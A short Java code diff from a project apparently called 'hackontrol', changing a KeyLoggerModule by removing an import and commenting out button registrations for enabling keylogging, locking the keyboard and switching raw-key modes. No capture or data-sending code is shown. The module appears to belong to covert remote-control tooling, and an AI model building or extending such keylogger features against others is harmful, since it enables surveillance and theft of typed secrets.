@@ -3,7 +3,6 @@ package com.khopan.hackontrol.module.keylogger;
 import java.util.List;
 
 import com.khopan.hackontrol.KeyboardHandler;
-import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
@@ -42,13 +41,13 @@ public class KeyLoggerModule extends Module {
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
+		/*registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
 		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_DISABLE,         context -> this.buttonEnable(context, false));
 		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_LOCK_KEYBOARD,   context -> this.buttonLock(context, true));
 		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
 		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_RAW_KEY_MODE,    context -> this.buttonRawKeyMode(context, true));
 		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_TEXT_MODE,       context -> this.buttonRawKeyMode(context, false));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_CLEAR,           this :: buttonClear);
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_CLEAR,           this :: buttonClear);*/
 	}
 
 	@Override
